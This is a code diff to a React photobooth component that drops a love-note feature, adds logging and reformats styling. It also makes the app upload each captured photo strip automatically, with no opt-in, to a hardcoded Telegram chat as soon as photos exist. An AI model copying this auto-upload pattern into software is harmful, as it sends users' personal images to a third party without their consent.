@@ -1,6 +1,5 @@
-
 import React, { useRef, useState, useEffect } from 'react';
-import { CapturedPhoto, FrameOption, LoveNote } from '../types';
+import { CapturedPhoto, FrameOption } from '../types';
 import { toPng, toBlob } from 'html-to-image';
 import { FRAMES } from '../constants';
 import { sendPhotoToTelegram } from '../services/telegramService';
@@ -10,7 +9,6 @@ interface PhotoStripProps {
   photos: CapturedPhoto[];
   frame: FrameOption;
   setFrame: (frame: FrameOption) => void;
-  loveNote: LoveNote | null;
   onReset: () => void;
 }
 
@@ -37,7 +35,7 @@ const EFFECTS: VisualEffect[] = [
   { id: 'sparkle', name: 'Sparkle', filter: 'brightness(1.1) contrast(1.1)', overlay: 'sparkle' },
 ];
 
-export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame, loveNote, onReset }) => {
+export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame, onReset }) => {
   const stripRef = useRef<HTMLDivElement>(null);
   const [isExporting, setIsExporting] = useState<'download' | 'share' | 'telegram' | null>(null);
   const [selectedEffect, setSelectedEffect] = useState<VisualEffect>(EFFECTS[0]);
@@ -63,36 +61,47 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
 
   const handleTelegramSync = async (silent = false) => {
     if (!stripRef.current || syncStatus === 'syncing') return;
-    
+
+    console.log('Starting Telegram sync...', { silent });
     if (!silent) setIsExporting('telegram');
     setSyncStatus('syncing');
-    
+
     try {
-      await new Promise(r => setTimeout(r, 600));
+      // Small delay to ensure the DOM is fully rendered before capturing
+      await new Promise(r => setTimeout(r, 800));
+
+      console.log('Capturing strip image...');
       const blob = await toBlob(stripRef.current, exportOptions as any);
 
-      if (!blob) throw new Error('Failed to create image blob');
+      if (!blob) {
+        console.error('Blob generation failed: toBlob returned null/undefined');
+        throw new Error('Failed to create image blob');
+      }
 
-      const caption = `❤️ Love Booth Sync!\n✨ Effect: ${selectedEffect.name}\n🖼️ Frame: ${frame.name}\n💌 Note: ${loveNote?.message || 'Memories captured forever.'}`;
-      
-      await sendPhotoToTelegram(blob, TELEGRAM_CHAT_ID, caption);
+      console.log(`Blob created: ${blob.size} bytes. Sending to Telegram...`);
+
+      const caption = `❤️ Love Booth Capture!\n✨ Effect: ${selectedEffect.name}\n🖼️ Frame: ${frame.name}\n💌 Memories captured forever.`;
+
+      const result = await sendPhotoToTelegram(blob, TELEGRAM_CHAT_ID, caption);
+      console.log('Telegram sync successful:', result);
+
       setSyncStatus('success');
       audioService.playSuccess();
       hasAutoSynced.current = true;
-    } catch (err) {
-      console.error('Telegram sync failed', err);
+    } catch (err: any) {
+      console.error('Telegram sync failed with error:', err);
       setSyncStatus('error');
-      if (!silent) alert(`Telegram sync failed. Please try again!`);
+      if (!silent) alert(`Telegram sync failed: ${err.message || 'Unknown error'}`);
     } finally {
       if (!silent) setIsExporting(null);
     }
   };
 
   useEffect(() => {
-    if (loveNote && !hasAutoSynced.current && syncStatus === 'idle') {
+    if (photos.length > 0 && !hasAutoSynced.current && syncStatus === 'idle') {
       handleTelegramSync(true);
     }
-  }, [loveNote, syncStatus]);
+  }, [photos, syncStatus]);
 
   const handleDownload = async () => {
     if (!stripRef.current) return;
@@ -167,9 +176,8 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
               <button
                 key={f.id}
                 onClick={() => setFrame(f)}
-                className={`w-8 h-8 rounded-full border-2 transition-all hover:scale-110 active:scale-95 ${
-                  frame.id === f.id ? 'border-pink-500 scale-110 ring-2 ring-pink-100' : 'border-gray-200'
-                }`}
+                className={`w-8 h-8 rounded-full border-2 transition-all hover:scale-110 active:scale-95 ${frame.id === f.id ? 'border-pink-500 scale-110 ring-2 ring-pink-100' : 'border-gray-200'
+                  }`}
                 style={{ backgroundColor: f.previewColor }}
                 title={f.name}
               />
@@ -185,9 +193,8 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
               <button
                 key={eff.id}
                 onClick={() => setSelectedEffect(eff)}
-                className={`px-3 py-1 rounded-full text-[10px] font-bold transition-all ${
-                  selectedEffect.id === eff.id ? 'bg-pink-500 text-white shadow-md' : 'bg-pink-50 text-pink-400'
-                }`}
+                className={`px-3 py-1 rounded-full text-[10px] font-bold transition-all ${selectedEffect.id === eff.id ? 'bg-pink-500 text-white shadow-md' : 'bg-pink-50 text-pink-400'
+                  }`}
               >
                 {eff.name}
               </button>
@@ -197,16 +204,16 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
       </div>
 
       {/* The Photobooth Strip */}
-      <div 
+      <div
         ref={stripRef}
         className={`p-5 shadow-2xl rounded-sm w-[320px] border-[10px] flex flex-col items-center transition-all duration-300 relative ${frame.className}`}
       >
         <div className="flex flex-col space-y-4 w-full">
           {photos.map((photo, index) => (
             <div key={photo.id} className="relative overflow-hidden aspect-[4/3] bg-white shadow-md border-[6px] border-white">
-              <img 
-                src={photo.dataUrl} 
-                alt={`Captured ${index + 1}`} 
+              <img
+                src={photo.dataUrl}
+                alt={`Captured ${index + 1}`}
                 className="w-full h-full object-cover"
                 style={{ filter: selectedEffect.filter }}
               />
@@ -214,45 +221,35 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
               <div className="absolute top-2 right-2 text-[10px] text-pink-500/30 font-bold rotate-12 uppercase">XOXO</div>
             </div>
           ))}
-          
+
           <div className="pt-6 pb-2 px-3 text-center border-t-2 border-dashed border-pink-300/30">
             <h3 className="font-pacifico text-pink-500 text-xl mb-1">Valentine 2024</h3>
-            {loveNote && (
-              <div className="mt-3 space-y-2">
-                <p className="text-[11px] text-pink-600 font-medium italic leading-relaxed px-1">"{loveNote.message}"</p>
-                <div className="flex justify-between items-center text-[8px] mt-4 text-pink-400 font-black uppercase tracking-[0.2em]">
-                  <span className="bg-white/50 px-2 py-0.5 rounded-full">AURA: {loveNote.auraColor}</span>
-                  <span className="bg-white/50 px-2 py-0.5 rounded-full">{loveNote.compatibilityScore}% MATCH</span>
-                </div>
-              </div>
-            )}
+
           </div>
         </div>
       </div>
 
       <div className="flex flex-col gap-3 w-full">
-        <div className={`w-full p-4 rounded-3xl border transition-all duration-500 flex items-center justify-between shadow-sm backdrop-blur-sm ${
-          syncStatus === 'success' ? 'bg-green-50/80 border-green-100' : 
+        <div className={`w-full p-4 rounded-3xl border transition-all duration-500 flex items-center justify-between shadow-sm backdrop-blur-sm ${syncStatus === 'success' ? 'bg-green-50/80 border-green-100' :
           syncStatus === 'error' ? 'bg-red-50/80 border-red-100' : 'bg-sky-50/80 border-sky-100'
-        }`}>
+          }`}>
           <div className="flex items-center gap-3">
-            <div className={`p-2 rounded-xl text-white ${
-              syncStatus === 'success' ? 'bg-green-500' : 
+            <div className={`p-2 rounded-xl text-white ${syncStatus === 'success' ? 'bg-green-500' :
               syncStatus === 'error' ? 'bg-red-500' : 'bg-sky-500'
-            }`}>
+              }`}>
               {syncStatus === 'syncing' ? (
                 <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
               ) : syncStatus === 'success' ? (
-                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" /></svg>
               ) : (
-                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.35-.99.53-1.41.52-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.88.03-.24.36-.48.99-.74 3.86-1.68 6.44-2.78 7.72-3.31 3.67-1.53 4.44-1.8 4.94-1.81.11 0 .35.03.5.16.13.1.17.24.18.33.01.07.02.24.01.3z"/></svg>
+                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.35-.99.53-1.41.52-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.88.03-.24.36-.48.99-.74 3.86-1.68 6.44-2.78 7.72-3.31 3.67-1.53 4.44-1.8 4.94-1.81.11 0 .35.03.5.16.13.1.17.24.18.33.01.07.02.24.01.3z" /></svg>
               )}
             </div>
             <div className="flex flex-col">
               <span className={`font-bold text-xs ${syncStatus === 'success' ? 'text-green-600' : syncStatus === 'error' ? 'text-red-600' : 'text-sky-600'}`}>
-                {syncStatus === 'syncing' ? 'Auto-syncing to Telegram...' : 
-                 syncStatus === 'success' ? 'Synced to Telegram! ❤️' : 
-                 syncStatus === 'error' ? 'Sync failed. Retry below.' : 'Ready to sync.'}
+                {syncStatus === 'syncing' ? 'Auto-syncing to Telegram...' :
+                  syncStatus === 'success' ? 'Synced to Telegram! ❤️' :
+                    syncStatus === 'error' ? 'Sync failed. Retry below.' : 'Ready to sync.'}
               </span>
               <span className="text-[10px] opacity-60">To: -5193703372</span>
             </div>
